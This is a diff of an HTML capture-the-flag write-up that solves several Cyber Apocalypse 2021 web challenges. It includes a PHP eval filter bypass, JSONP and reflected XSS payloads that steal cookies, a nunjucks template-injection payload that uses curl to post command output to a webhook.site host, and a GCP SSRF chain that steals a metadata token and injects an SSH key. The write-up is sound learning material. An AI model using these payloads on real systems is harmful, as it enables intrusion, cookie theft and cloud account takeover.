-     is a function by adding brackets at the end of it (see one of the tricks I listed above). We can bypass the
-     <code>
-      
+ </code>
+ is a function by adding brackets at the end of it (see one of the tricks I listed above). We can bypass the
+ <code>
   preg_match_all
- 
-     </code>
-     filter by using the
-     <strong>
-      binary complement
-     </strong>
-     of both strings since they would not have any letters in it. When we get to the
-     <code>
-      
+ </code>
+ filter by using the
+ <strong>
+  binary complement
+ </strong>
+ of both strings since they would not have any letters in it. When we get to the
+ <code>
   eval
- 
-     </code>
-     function we will flip the bits of the strings again to get our original ones using the PHP operator
-     <code>
-      
+ </code>
+ function we will flip the bits of the strings again to get our original ones using the PHP operator
+ <code>
   ~
- 
-     </code>
-     . Finally we chuck this all inside
-     <code>
-      
+ </code>
+ . Finally we chuck this all inside
+ <code>
   ${}
- 
-     </code>
-     and use
-     <code>
-      
+ </code>
+ and use
+ <code>
   ()
- 
-     </code>
-     to make PHP flip the bits of our payload first before executing the function.
-    </p>
-    <p>
-     Here is the python code that can be used to generate the payload
-     <code>
-      
+ </code>
+ to make PHP flip the bits of our payload first before executing the function.
+</p>
+<p>
+ Here is the python code that can be used to generate the payload
+ <code>
   /?formula=${(~%8c%86%8c%8b%9a%92)((~%9c%9e%8b%df%d0%d5))}
- 
-     </code>
-     .
-    </p>
-    <pre class="codehilite"><code>def get_payload_component(orig_str):
+ </code>
+ .
+</p>
+<pre class="codehilite"><code>def get_payload_component(orig_str):
     orig_bytes = orig_str.encode();
     return ''.join([hex(ord(x) ^ 0xff).replace("0x", "%") for x in orig_bytes])
 
@@ -910,471 +782,419 @@ payload = "/?formula=${{(~{payload_1})((~{payload_2}))}}".format(
 )
 print(payload)
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/pcalc_pwn.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style3 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Alien Complient Form
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{CSP_4nd_Js0np_d0_n0t_alw4ys_g3t_al0ng}
-       </td>
-       <td>
-        110
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     This is another XSS challenge which at first seemed similar to
-     <em>
-      The Galactic Times
-     </em>
-     challenge, but I quickly realised that it was a completely different type of XSS attack. The goal for this challenge is to trigger a reflective XSS attack on the bot that visits the internal page
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/pcalc_pwn.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Alien Complient Form
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{CSP_4nd_Js0np_d0_n0t_alw4ys_g3t_al0ng}
+   </td>
+   <td>
+    110
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ This is another XSS challenge which at first seemed similar to
+ <em>
+  The Galactic Times
+ </em>
+ challenge, but I quickly realised that it was a completely different type of XSS attack. The goal for this challenge is to trigger a reflective XSS attack on the bot that visits the internal page
+ <code>
   /list
- 
-     </code>
-     and steal the flag from it's cookies. However, this time no external resources could be loaded in or accessed.
-    </p>
-    <p>
-     The first thing I noted that the API endpoint at
-     <code>
-      
+ </code>
+ and steal the flag from it's cookies. However, this time no external resources could be loaded in or accessed.
+</p>
+<p>
+ The first thing I noted that the API endpoint at
+ <code>
   /api/jsonp
- 
-     </code>
-     also had this really weird option for specifying a callback function from the GET parameter
-     <code>
-      
+ </code>
+ also had this really weird option for specifying a callback function from the GET parameter
+ <code>
   callback
- 
-     </code>
-     . So if the
-     <code>
-      
+ </code>
+ . So if the
+ <code>
   /list
- 
-     </code>
-     page called for
-     <code>
-      
+ </code>
+ page called for
+ <code>
   /api/jsonp?callback=alert(123)
- 
-     </code>
-     instead of just
-     <code>
-      
+ </code>
+ instead of just
+ <code>
   /api/jsonp
- 
-     </code>
-     , I could execute JavaScript on the bots browser. I was able to do this by using an
-     <code>
-      
+ </code>
+ , I could execute JavaScript on the bots browser. I was able to do this by using an
+ <code>
   iframe
- 
-     </code>
-     to point back the the
-     <code>
-      
+ </code>
+ to point back the the
+ <code>
   /api/jsonp
- 
-     </code>
-     to execute my XSS attack.
-    </p>
-    <p>
-     However, this introduced the next problem of exfiltrating the cookie from the bot so we can read the flag. I could not
-     <code>
-      
+ </code>
+ to execute my XSS attack.
+</p>
+<p>
+ However, this introduced the next problem of exfiltrating the cookie from the bot so we can read the flag. I could not
+ <code>
   fetch
- 
-     </code>
-     any resources external to the website, so I could not simply send a HTTP request with the flag to a web hook. After a while, I realised that
-     <code>
-      
+ </code>
+ any resources external to the website, so I could not simply send a HTTP request with the flag to a web hook. After a while, I realised that
+ <code>
   /api/jsonp
- 
-     </code>
-     also lists the feedback that is stored within the database. Therefore, if I get the bot to POST it's cookies as feedback I will be able to read it from
-     <code>
-      
+ </code>
+ also lists the feedback that is stored within the database. Therefore, if I get the bot to POST it's cookies as feedback I will be able to read it from
+ <code>
   /api/jsonp
- 
-     </code>
-     , but I had to be quick since the bot quickly wipes the database after it reads the feedback. To be as quick as possible I executed a bash script on my machine to try and grab the flag when it appeared. The final payload that got me the flag is below.
-    </p>
-    <pre class="codehilite"><code>&lt;iframe src="/list?callback=let x = {'complaint':document.cookie};fetch('/api/submit',{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify(x)})" /&gt;
+ </code>
+ , but I had to be quick since the bot quickly wipes the database after it reads the feedback. To be as quick as possible I executed a bash script on my machine to try and grab the flag when it appeared. The final payload that got me the flag is below.
+</p>
+<pre class="codehilite"><code>&lt;iframe src="/list?callback=let x = {'complaint':document.cookie};fetch('/api/submit',{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify(x)})" /&gt;
 </code></pre>
-    <p>
-     <strong>
-      bash command to get the flag
-     </strong>
-    </p>
-    <pre class="codehilite"><code>while :; do curl -s http://138.68.177.159:30904/api/jsonp | grep CHTB; done
+<p>
+ <strong>
+  bash command to get the flag
+ </strong>
+</p>
+<pre class="codehilite"><code>while :; do curl -s http://138.68.177.159:30904/api/jsonp | grep CHTB; done
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/alien_compliant_form.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style2">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Starfleet
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
-       </td>
-       <td>
-        141
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     I never really liked being a human, so I decided to join the "Starfleet academy" to join the aliens. The only problem was that I got distracted hacking their site... When you visit the page you are just granted with a basic page with an email signup form.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/starfleet.png"/>
-    </p>
-    <p>
-     When the user signs up for the "Starfleet academy", their email address is chucked into a string which is rendered using the
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/alien_compliant_form.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Starfleet
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
+   </td>
+   <td>
+    141
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ I never really liked being a human, so I decided to join the "Starfleet academy" to join the aliens. The only problem was that I got distracted hacking their site... When you visit the page you are just granted with a basic page with an email signup form.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/starfleet.png"/>
+</p>
+<p>
+ When the user signs up for the "Starfleet academy", their email address is chucked into a string which is rendered using the
+ <code>
   node
- 
-     </code>
-     template engine
-     <code>
-      
+ </code>
+ template engine
+ <code>
   nunjucks
- 
-     </code>
-     (see code snippet below). This to me screams out that it is vulnerable to Server-Side Template Injection (SSTI). SSTI is when you can execute code within the template engine, which can be leveraged to compromise the system.
-    </p>
-    <pre class="codehilite"><code>message.html = nunjucks.renderString(`
+ </code>
+ (see code snippet below). This to me screams out that it is vulnerable to Server-Side Template Injection (SSTI). SSTI is when you can execute code within the template engine, which can be leveraged to compromise the system.
+</p>
+<pre class="codehilite"><code>message.html = nunjucks.renderString(`
                         &lt;p&gt;&lt;b&gt;Hello&lt;/b&gt; &lt;i&gt;${ emailAddress }&lt;/i&gt;&lt;/p&gt;
                         &lt;p&gt;A cat has been deployed to process your submission 🐈&lt;/p&gt;&lt;br/&gt;
                         &lt;img width="500" height="350" src="cid:{{ gifSrc }}"/&gt;&lt;/p&gt;
                         `, { gifSrc }
                     );
 </code></pre>
-    <p>
-     The only problem is that I did not have experience vulnerabilities with
-     <code>
-      
+<p>
+ The only problem is that I did not have experience vulnerabilities with
+ <code>
   node
- 
-     </code>
-     before this. I have exploited other SSTI vulnerabilities in different template engines, but I had to do a bit of research to understand how to craft a payload that will allow me to run terminal commands. Eventually, I realised that the SSTI payload for Jade tempalte engine from
-     <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig">
-      here
-     </a>
-     would be very similar for
-     <code>
-      
+ </code>
+ before this. I have exploited other SSTI vulnerabilities in different template engines, but I had to do a bit of research to understand how to craft a payload that will allow me to run terminal commands. Eventually, I realised that the SSTI payload for Jade tempalte engine from
+ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig">
+  here
+ </a>
+ would be very similar for
+ <code>
   nunjucks
- 
-     </code>
-     since both engines run on
-     <code>
-      
+ </code>
+ since both engines run on
+ <code>
   node
- 
-     </code>
-     . My final payload for the email address is as folllows.
-    </p>
-    <pre class="codehilite"><code>{{range.constructor("global.process.mainModule.require('child_process').execSync('curl -XPOST -d \"$(/readflag)\" https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14').stdout")()}}
+ </code>
+ . My final payload for the email address is as folllows.
+</p>
+<pre class="codehilite"><code>{{range.constructor("global.process.mainModule.require('child_process').execSync('curl -XPOST -d \"$(/readflag)\" https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14').stdout")()}}
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/join_the_starfleet_today.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style5 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Bug Report
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{th1s_1s_my_bug_r3p0rt}
-       </td>
-       <td>
-        208
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     Once again this is another XSS challenge with a different twist to the other ones. This time the website is a bug reporting page that visits the page that you provide. However, if you visit a page that does not exist it actually dumps the name of the invalid path straight into a html document; meaning that it can be used to execute JavaScript!
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/bug_report.png"/>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/bug_report_xss.png"/>
-    </p>
-    <p>
-     So instead of asking the internal bot to visit an external site, you get the bot to visit an non-existent page on the server to trigger the XSS payload. Once again I just used
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/join_the_starfleet_today.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Bug Report
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{th1s_1s_my_bug_r3p0rt}
+   </td>
+   <td>
+    208
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ Once again this is another XSS challenge with a different twist to the other ones. This time the website is a bug reporting page that visits the page that you provide. However, if you visit a page that does not exist it actually dumps the name of the invalid path straight into a html document; meaning that it can be used to execute JavaScript!
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/bug_report.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/bug_report_xss.png"/>
+</p>
+<p>
+ So instead of asking the internal bot to visit an external site, you get the bot to visit an non-existent page on the server to trigger the XSS payload. Once again I just used
+ <code>
   fetch
- 
-     </code>
-     to POST the cookie with flag to a webhook I had control over.
-    </p>
-    <p>
-     <strong>
-      Payload to submit on the report page
-     </strong>
-    </p>
-    <pre class="codehilite"><code>http://127.0.0.1:1337/&lt;script&gt;var x = document.cookie;fetch('https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14',{method:'post',body:'test='+x})&lt;/script&gt;
+ </code>
+ to POST the cookie with flag to a webhook I had control over.
+</p>
+<p>
+ <strong>
+  Payload to submit on the report page
+ </strong>
+</p>
+<pre class="codehilite"><code>http://127.0.0.1:1337/&lt;script&gt;var x = document.cookie;fetch('https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14',{method:'post',body:'test='+x})&lt;/script&gt;
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/bug_report_flag.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style4">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     gcloud pwn
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{l00k_4t_m3_n0w_I_0wn_4ll_th3_cl0ut!}
-       </td>
-       <td>
-        23
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     This was challenge was one of my personal favourites from this CTF event. The challenge was exploiting a PDF viewer that was hosted on Google Cloud Platform (will be abbreviated as gcloud from now on). The first thing that I thought of when I saw this and read the description that the pdf viewer that the bot visiting the page used is vulnerable to Server-Side Request Forgery (SSRF). I tested if it was and by seeing if I could read
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/bug_report_flag.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ gcloud pwn
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{l00k_4t_m3_n0w_I_0wn_4ll_th3_cl0ut!}
+   </td>
+   <td>
+    23
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ This was challenge was one of my personal favourites from this CTF event. The challenge was exploiting a PDF viewer that was hosted on Google Cloud Platform (will be abbreviated as gcloud from now on). The first thing that I thought of when I saw this and read the description that the pdf viewer that the bot visiting the page used is vulnerable to Server-Side Request Forgery (SSRF). I tested if it was and by seeing if I could read
+ <code>
   /etc/passwd
- 
-     </code>
-     using an iframe, which I was able to do.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_lfi.png"/>
-    </p>
-    <p>
-     What this meant is that now I can access the internal gcloud metadata API with the domain
-     <code>
-      
+ </code>
+ using an iframe, which I was able to do.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_lfi.png"/>
+</p>
+<p>
+ What this meant is that now I can access the internal gcloud metadata API with the domain
+ <code>
   metadata.google.internal
- 
-     </code>
-     to see if I can steal an access token. I found this
-     <a href="https://hackerone.com/reports/341876">
-      Hackerone report on exploiting a SSRF vulnerability in shopify
-     </a>
-     very useful. The two key takeaways from this report and the
-     <a href="https://download.huihoo.com/google/gdgdevkit/DVD1/developers.google.com/compute/docs/metadata.html">
-      internal API documentation
-     </a>
-     about how to use the gcloud API to collect information that I found were:
-    </p>
-    <ul>
-     <li>
-      When using the
-      <code>
-       
+ </code>
+ to see if I can steal an access token. I found this
+ <a href="https://hackerone.com/reports/341876">
+  Hackerone report on exploiting a SSRF vulnerability in shopify
+ </a>
+ very useful. The two key takeaways from this report and the
+ <a href="https://download.huihoo.com/google/gdgdevkit/DVD1/developers.google.com/compute/docs/metadata.html">
+  internal API documentation
+ </a>
+ about how to use the gcloud API to collect information that I found were:
+</p>
+<ul>
+ <li>
+  When using the
+  <code>
    metadata.google.internal
-  
-      </code>
-      the
-      <code>
-       
+  </code>
+  the
+  <code>
    v1beta1
-  
-      </code>
-      API needs to be used since it does not require a specific HTTP header like the
-      <code>
-       
+  </code>
+  API needs to be used since it does not require a specific HTTP header like the
+  <code>
    v1
-  
-      </code>
-      API does.
-     </li>
-     <li>
-      Using the GET parameter
-      <code>
-       
+  </code>
+  API does.
+ </li>
+ <li>
+  Using the GET parameter
+  <code>
    alt=json
-  
-      </code>
-      returns the API response as a JSON document.
-     </li>
-     <li>
-      Using the GET parameter
-      <code>
-       
+  </code>
+  returns the API response as a JSON document.
+ </li>
+ <li>
+  Using the GET parameter
+  <code>
    recursive=true
-  
-      </code>
-      allows you to recurse through the different attributes or properties that an instance or project has.
-     </li>
-     <li>
-      The endpoint
-      <code>
-       
+  </code>
+  allows you to recurse through the different attributes or properties that an instance or project has.
+ </li>
+ <li>
+  The endpoint
+  <code>
    http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
-  
-      </code>
-      returns the current access token
-      <strong>
-       for the instance
-      </strong>
-      .
-     </li>
-     <li>
-      You can list all of the attributes for a instance by sending a GET request to the endpoint
-      <code>
-       
+  </code>
+  returns the current access token
+  <strong>
+   for the instance
+  </strong>
+  .
+ </li>
+ <li>
+  You can list all of the attributes for a instance by sending a GET request to the endpoint
+  <code>
    http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true&amp;alt=json
-  
-      </code>
-      .
-     </li>
-    </ul>
-    <p>
-     Using this I quickly grabbed a valid access token for the instance, project name, location and instance name for the web server.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_token.png"/>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_metadata.png"/>
-    </p>
-    <ul>
-     <li>
-      <strong>
-       Project Name:
-      </strong>
-      essential-hawk-310212
-     </li>
-     <li>
-      <strong>
-       Location Zone:
-      </strong>
-      us-central1-a
-     </li>
-     <li>
-      <strong>
-       Instance Name:
-      </strong>
-      instance-1
-     </li>
-    </ul>
-    <p>
-     With this exfiltrated access token, it can be used to authorize access to other Google APIs using the
-     <code>
-      
+  </code>
+  .
+ </li>
+</ul>
+<p>
+ Using this I quickly grabbed a valid access token for the instance, project name, location and instance name for the web server.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_token.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_metadata.png"/>
+</p>
+<ul>
+ <li>
+  <strong>
+   Project Name:
+  </strong>
+  essential-hawk-310212
+ </li>
+ <li>
+  <strong>
+   Location Zone:
+  </strong>
+  us-central1-a
+ </li>
+ <li>
+  <strong>
+   Instance Name:
+  </strong>
+  instance-1
+ </li>
+</ul>
+<p>
+ With this exfiltrated access token, it can be used to authorize access to other Google APIs using the
+ <code>
   Authorization: Bearer &lt;access token&gt;
- 
-     </code>
-     HTTP header. However, at this point I went into a massive rabbit hole for about an hour and a half. My mistake was that I started trying to see if I had access to other gcloud services using the access token I had, but I could not get in anywhere. My mistake was that I forgot that the access token was specifically for the instance itself. I realised my mistake when I listed the metadata for the instance again using the following curl command. I discovered this API endpoint when I was reading about managing
-     <a href="https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#api_2">
-      SSH keys on gcloud using the REST API
-     </a>
-     .
-    </p>
-    <pre class="codehilite"><code>curl -H "Authorization: Bearer &lt;access token&gt;" -H "Content-type: application/json" https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1
+ </code>
+ HTTP header. However, at this point I went into a massive rabbit hole for about an hour and a half. My mistake was that I started trying to see if I had access to other gcloud services using the access token I had, but I could not get in anywhere. My mistake was that I forgot that the access token was specifically for the instance itself. I realised my mistake when I listed the metadata for the instance again using the following curl command. I discovered this API endpoint when I was reading about managing
+ <a href="https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#api_2">
+  SSH keys on gcloud using the REST API
+ </a>
+ .
+</p>
+<pre class="codehilite"><code>curl -H "Authorization: Bearer &lt;access token&gt;" -H "Content-type: application/json" https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_sshkey_metadata.png"/>
-    </p>
-    <p>
-     It was at this point I realised I goofed up and I should of just been targetting the instance the whole time and not other services...
-    </p>
-    <p>
-     I decided to test if I could overwrite this entry in the metadata and insert my public SSH key instead.
-     <a href="https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#api_2">
-      Reading the documentation on managing the public SSH keys
-     </a>
-     , I had to send a POST request to the API endpoint
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_sshkey_metadata.png"/>
+</p>
+<p>
+ It was at this point I realised I goofed up and I should of just been targetting the instance the whole time and not other services...
+</p>
+<p>
+ I decided to test if I could overwrite this entry in the metadata and insert my public SSH key instead.
+ <a href="https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#api_2">
+  Reading the documentation on managing the public SSH keys
+ </a>
+ , I had to send a POST request to the API endpoint
+ <code>
   https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1/setMetadata
- 
-     </code>
-     with the following JSON body.
-    </p>
-    <p>
-     <strong>
-      payload.json
-     </strong>
-    </p>
-    <pre class="codehilite"><code class="language-json">{
+ </code>
+ with the following JSON body.
+</p>
+<p>
+ <strong>
+  payload.json
+ </strong>
+</p>
+<pre class="codehilite"><code class="language-json">{
     "items": [
         {
             "key": "ssh-keys",
@@ -1384,34 +1204,26 @@ print(payload)
     "fingerprint" : "3OBr4seS2Vk="
 }
 </code></pre>
-    <p>
-     The value for
-     <code>
-      
+<p>
+ The value for
+ <code>
   ssh-keys
- 
-     </code>
-     has to be in the format of
-     <code>
-      
+ </code>
+ has to be in the format of
+ <code>
   &lt;username&gt;:&lt;public ssh key&gt;
- 
-     </code>
-     and the
-     <code>
-      
+ </code>
+ and the
+ <code>
   fingerprint
- 
-     </code>
-     parameter is obtained from a GET request to
-     <code>
-      
+ </code>
+ parameter is obtained from a GET request to
+ <code>
   https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1
- 
-     </code>
-     that is used to prevent simultaneous changes to metadata that is shown below.
-    </p>
-    <pre class="codehilite"><code>"metadata": {
+ </code>
+ that is used to prevent simultaneous changes to metadata that is shown below.
+</p>
+<pre class="codehilite"><code>"metadata": {
     "fingerprint": "3OBr4seS2Vk=",
     "items": [
       {
@@ -1422,41 +1234,34 @@ print(payload)
     "kind": "compute#metadata"
   }
 </code></pre>
-    <p>
-     Finally, to inject my public SSH key I used the following
-     <code>
-      
+<p>
+ Finally, to inject my public SSH key I used the following
+ <code>
   curl
- 
-     </code>
-     command to update the metadata for SSH keys.
-    </p>
-    <pre class="codehilite"><code>curl -H "Authorization: Bearer &lt;access token&gt;" -H "Content-type: application/json" -d @payload.json https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1/setMetadata
+ </code>
+ command to update the metadata for SSH keys.
+</p>
+<pre class="codehilite"><code>curl -H "Authorization: Bearer &lt;access token&gt;" -H "Content-type: application/json" -d @payload.json https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1/setMetadata
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_upload_ssh.png"/>
-    </p>
-    <p>
-     Once that was done, I could SSH into the server with the account
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_upload_ssh.png"/>
+</p>
+<p>
+ Once that was done, I could SSH into the server with the account
+ <code>
   root
- 
-     </code>
-     using my own private key and grab the flag from
-     <code>
-      
+ </code>
+ using my own private key and grab the flag from
+ <code>
   /root/pdfservice/flag
- 
-     </code>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_pwnd.png"/>
-    </p>
-   </div>
-  </div>
- </section>
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_pwnd.png"/>
+</p></div>
+</div>
+</section>
 </section>
 
     	</div>
